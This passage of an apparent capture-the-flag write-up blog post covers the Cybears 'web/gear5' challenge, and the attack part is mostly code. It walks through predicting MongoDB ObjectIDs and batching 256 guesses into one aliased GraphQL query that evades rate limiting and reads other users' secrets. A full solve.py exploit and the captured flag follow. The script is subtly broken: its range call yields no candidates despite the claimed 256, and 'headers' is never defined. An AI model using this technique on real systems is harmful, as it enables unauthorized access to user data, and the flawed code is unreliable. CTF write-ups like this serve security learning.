+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">tmp_id_part</span> <span class="o">=</span> <span class="n">user_id</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">18</span><span class="p">]</span>  <span class="c1"># Middle 5 bytes (random component)</span>
+</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">user_id</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>  <span class="c1"># Last 3 bytes (counter)</span></span></span></code></pre></div></div>
+<p>The key insight: the random component (machine/process identifier) stays the same across all users created on the same server instance. And the counter increments sequentially. So if my user has counter <code>0xcdcb5d</code>, the target user created slightly earlier might have counter <code>0xcdcb56</code> or somewhere in that range!</p>
+<h3 id="discovery-7-generating-candidate-objectids">Discovery #7: Generating Candidate ObjectIDs</h3>
+<p>Now I could generate candidate ObjectIDs for the target user:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Convert target timestamp to hex</span>
+</span></span><span class="line"><span class="cl"><span class="n">created_at_timestamp_ms</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">target_user</span><span class="p">[</span><span class="s2">&#34;createdAt&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">time_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">created_at_timestamp_ms</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Generate range of possible ObjectIDs</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We try 256 different counter values before our registered user</span>
+</span></span><span class="line"><span class="cl"><span class="n">uuids</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">time_hex</span><span class="si">}{</span><span class="n">tmp_id_part</span><span class="si">}{</span><span class="n">i</span><span class="si">:</span><span class="s2">06x</span><span class="si">}</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">counter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span></span></span></code></pre></div></div>
+<p>This gave me a list of 256 possible ObjectIDs. Statistically, one of these was very likely to be the target user&rsquo;s ID!</p>
+<p>Now I had everything I needed: 256 candidate IDs and a way to query them all at once using GraphQL aliases without triggering the rate limiter. Time to put it all together!</p>
+<h3 id="discovery-8-building-the-aliased-query">Discovery #8: Building the Aliased Query</h3>
+<p>I generated the full query with all 256 candidate IDs using aliases:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">query_lines</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;u</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s2">: userSensitive(id:</span><span class="se">\&#34;</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">) </span><span class="se">{{</span><span class="s2">secret</span><span class="se">}}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">uuid</span> <span class="ow">in</span> <span class="n">uuids</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">graphql_query</span> <span class="o">=</span> <span class="s2">&#34;query {&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">query_lines</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span></span></span></code></pre></div></div>
+<p>The final query looked something like this (shortened for readability):</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-graphql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-graphql" data-lang="graphql"><span class="line"><span class="cl"><span class="kd">query</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nc">u691c3c380ce6320d62cdcb2d</span><span class="p">:</span><span class="w"> </span><span class="nc">userSensitive</span><span class="p">(</span><span class="py">id</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;691c3c380ce6320d62cdcb2d&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nc">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="py">u691c3c380ce6320d62cdcb2e</span><span class="p">:</span><span class="w"> </span><span class="nc">userSensitive</span><span class="p">(</span><span class="py">id</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;691c3c380ce6320d62cdcb2e&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nc">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="c"># ... 254 more aliased queries ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
+<hr>
+<h2 id="putting-it-all-together">Putting It All Together</h2>
+<p>The complete attack chain:</p>
+<ol>
+<li><strong>Introspection</strong> reveals <code>allUsersTimestamps</code> and <code>userSensitive</code> queries</li>
+<li><strong>Extract timestamps</strong> from <code>allUsersTimestamps</code> to get target user creation time</li>
+<li><strong>Register a user</strong> to learn the random component and counter range</li>
+<li><strong>Generate 256 candidate ObjectIDs</strong> using target timestamp + extracted components</li>
+<li><strong>Build aliased GraphQL query</strong> with all 256 IDs to bypass rate limiting</li>
+<li><strong>Send single request</strong> that queries all candidates simultaneously</li>
+<li><strong>Extract the flag</strong> from the successful response</li>
+</ol>
+<h3 id="the-complete-exploit-script">The Complete Exploit Script</h3>
+<p>Here&rsquo;s the core of <code>solve.py</code>:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GRAPHQL_URL</span> <span class="o">=</span> <span class="s2">&#34;https://gear5-06dffe5c48ac6a2d.ctf.clawtheflag.com/graphql&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 1: Get timestamps</span>
+</span></span><span class="line"><span class="cl"><span class="n">timestamp_query</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;query&#34;</span><span class="p">:</span> <span class="s2">&#34;query { allUsersTimestamps { createdAt } }&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">GRAPHQL_URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">timestamp_query</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_timestamps</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;allUsersTimestamps&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">ts</span> <span class="ow">in</span> <span class="n">target_timestamps</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_user</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;createdAt&#34;</span><span class="p">:</span> <span class="n">ts</span><span class="p">[</span><span class="s2">&#34;createdAt&#34;</span><span class="p">]}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">created_at_timestamp_ms</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">target_user</span><span class="p">[</span><span class="s2">&#34;createdAt&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">created_at_timestamp_ms</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 2: Register user to extract components</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_user</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker_&#34;</span> <span class="o">+</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[:</span><span class="mi">6</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker_&#34;</span> <span class="o">+</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;@example.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;password123&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;secret&#34;</span><span class="p">:</span> <span class="s2">&#34;secret123&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">register_payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;query&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mutation Register($username: String!, $email: String!, $password: String!, $secret: String!) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">              register(username: $username, email: $email, password: $password, secret: $secret) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                user { id }
+</span></span></span><span class="line"><span class="cl"><span class="s2">              }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;variables&#34;</span><span class="p">:</span> <span class="n">new_user</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">GRAPHQL_URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">register_payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;register&#34;</span><span class="p">][</span><span class="s2">&#34;user&#34;</span><span class="p">][</span><span class="s2">&#34;id&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 3: Extract components</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tmp_id_part</span> <span class="o">=</span> <span class="n">user_id</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">counter</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">user_id</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 4: Generate candidates</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uuids</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">time_hex</span><span class="si">}{</span><span class="n">tmp_id_part</span><span class="si">}{</span><span class="n">i</span><span class="si">:</span><span class="s2">06x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">counter</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 5: Build aliased query</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query_lines</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&#34;u</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s2">: userSensitive(id:</span><span class="se">\&#34;</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">) </span><span class="se">{{</span><span class="s2">secret</span><span class="se">}}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">uuid</span> <span class="ow">in</span> <span class="n">uuids</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">graphql_query</span> <span class="o">=</span> <span class="s2">&#34;query {&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">query_lines</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 6: Send request</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;query&#34;</span><span class="p">:</span> <span class="n">graphql_query</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">GRAPHQL_URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Status code: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">value</span> <span class="ow">and</span> <span class="s1">&#39;cybears{&#39;</span> <span class="ow">in</span> <span class="n">value</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;secret&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found flag in </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">value</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></div></div>
+<h2 id="after-running-the-exploit-the-response-came-back-with-the-flag">After running the exploit, the response came back with the flag!</h2>
+<p>Cybears{now_you_are_a_hacker_with_gear_5_powers_no_one_can_stop_you}</p>
+<h2 id="and-by-that-you-officially-have-gear5-powers">and by that you officially have gear5 powers</h2>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/cybears_ctf_web_gear5/gear5.gif"
+        data-srcset="/blog/images/cybears_ctf_web_gear5/gear5.gif, /blog/images/cybears_ctf_web_gear5/gear5.gif 1.5x, /blog/images/cybears_ctf_web_gear5/gear5.gif 2x"
+        data-sizes="auto"
+        alt="/blog/images/cybears_ctf_web_gear5/gear5.gif"
+        title="gear5" /></p>
+<hr>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-title="Cybears ctf web/gear5" data-via="Benhibafodhil" data-hashtags="ctf,web security,cybears_ctf,my_challenges"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-title="Cybears ctf web/gear5"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-title="Cybears ctf web/gear5"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-title="Cybears ctf web/gear5"><i data-svg-src="/blog/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-title="Cybears ctf web/gear5"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" data-title="Cybears ctf web/gear5" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fcybears_ctf_web_gear5%2f&amp;text=Cybears%20ctf%20web%2fgear5" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/web-security/">Web Security</a>,&nbsp;<a href="/blog/tags/cybears_ctf/">Cybears_ctf</a>,&nbsp;<a href="/blog/tags/my_challenges/">My_challenges</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" class="prev" rel="prev" title="Bsides algiers 2k25 web/Library Vaults"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Bsides algiers 2k25 web/Library Vaults</a>
+            <a href="/blog/posts/cybears_ctf_web_ozymandias/" class="next" rel="next" title="Cybears ctf web/ozymandias">Cybears ctf web/ozymandias<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/blog/" target="_blank">F0DH1L</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/blog/css/custom.css"><script src="/blog/lib/lazysizes/lazysizes.min.js"></script><script src="/blog/lib/clipboard/clipboard.min.js"></script><script src="/blog/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/blog/js/theme.min.js"></script></body>
+</html>
